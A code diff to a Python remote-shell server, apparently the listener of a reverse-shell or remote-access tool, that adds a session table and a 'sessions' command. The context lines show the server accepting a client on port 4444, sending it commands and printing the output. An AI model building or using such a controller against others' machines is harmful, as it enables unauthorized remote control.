@@ -4,6 +4,8 @@ from time import sleep
 from os import system, getenv, name
 from usefull import *
 import json
+from terminaltables import DoubleTable
+
 
 ## set the clear command by os name
 windows = False
@@ -27,8 +29,13 @@ class Server:
     def start(SERVER_PORT=4444, SERVER_HOST="0.0.0.0"):
 
         print(f"{info}Server started")
-
-
+        dictionnaire = {"id": [],
+                        "ip": [],
+                        "port": [],}
+        list = [
+            ["id","ip","port"]
+        ]
+        ids = 0
 
 
         BUFFER_SIZE = 1024 * 128
@@ -45,7 +52,15 @@ class Server:
         client_socket, client_address = s.accept()
         print(f"{sub}{magenta}{client_address[0]}:{client_address[1]}{reset} Connected!")
 
+        title = "Sessions"
+        list.append((ids,client_address[0],client_address[1]))
 
+
+        table_instance = DoubleTable(list, title)
+        table_instance.justify_columns[0] = 'center'
+        table_instance.justify_columns[1] = 'center'
+        table_instance.justify_columns[2] = 'center'
+        ids += 1
         cwd = client_socket.recv(BUFFER_SIZE).decode()
         print(f"{info}Current working directory: {cyan}{cwd}{reset}")
         while True:
@@ -69,6 +84,12 @@ class Server:
                 client_socket.send(cmd.encode())
                 output = client_socket.recv(BUFFER_SIZE).decode()
                 print(f'{magenta}Shell: {cyan}{output}')
+            elif cmd[0:8] == "sessions":
+                print(table_instance.table)
+
+            else:
+                print(f"{error}Unknown command! Type \"help\"")
+
 
         while True:
             # get the command from prompt
